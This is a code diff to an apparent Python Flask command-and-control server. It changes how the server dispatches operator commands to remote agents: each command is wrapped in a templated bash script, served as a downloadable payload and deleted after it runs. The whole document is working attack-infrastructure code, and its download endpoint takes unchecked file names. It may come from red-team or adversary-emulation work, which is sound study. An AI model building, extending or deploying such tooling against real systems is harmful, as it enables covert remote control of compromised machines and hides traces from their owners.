@@ -1,5 +1,6 @@
 from flask import Flask, request, jsonify
 import json
+import os
 import base64
 import binascii
 from models.instruction import Instruction
@@ -7,6 +8,7 @@ import uuid
 from collections import defaultdict
 from models.command import Command, CommandStatus
 from models.command_result import CommandResult
+from string import Template
 
 app = Flask(__name__)
 
@@ -22,6 +24,15 @@ def decode_base64(data):
 
 def encode_base64(data):
     return str(base64.b64encode(json.dumps(data).encode()), "utf-8")
+
+
+def read_template_file(filename):
+    template_dir = "./c2server/payloads/template_payloads"
+    template_path = f"{template_dir}/{filename}"
+    with open(template_path, "r") as file:
+        template_content = file.read()
+    template = Template(template_content)
+    return template
 
 
 # Agent check-in
@@ -108,15 +119,24 @@ def send_command():
         if agent not in agents:
             return jsonify({"error": "Agent not found"}), 404
 
+        exec_template = read_template_file("Exec_Bash_Template.sh")
+        executor_script_content = exec_template.safe_substitute(command=command)
+        executor_script_path = f"./c2server/payloads/dynamic_payloads/exec_script.sh"
+
+        with open(executor_script_path, "w") as temp_script:
+            temp_script.write(executor_script_content)
+
+        payloads.append("exec_script.sh")
+
         command_id = str(uuid.uuid4())
         instruction = Instruction(
             id=command_id,
-            command=encode_base64(command),
+            command=encode_base64("./exec_script.sh"),
             executor="sh",
             timeout=60,
             payloads=payloads,
             uploads=[],
-            delete_payload=False,
+            delete_payload=True,
         )
         command = Command(
             id=command_id,
@@ -158,7 +178,9 @@ def download():
         if not file_name:
             return jsonify({"error": "Missing file name"}), 400
 
-        file_path = f"/attacker/c2server/payloads/{file_name}"
+        file_path = f"./c2server/payloads/{file_name}"
+        if not os.path.exists(file_path):
+            file_path = f"./c2server/payloads/dynamic_payloads/{file_name}"
         with open(file_path, "rb") as f:
             file_data = f.read()
 
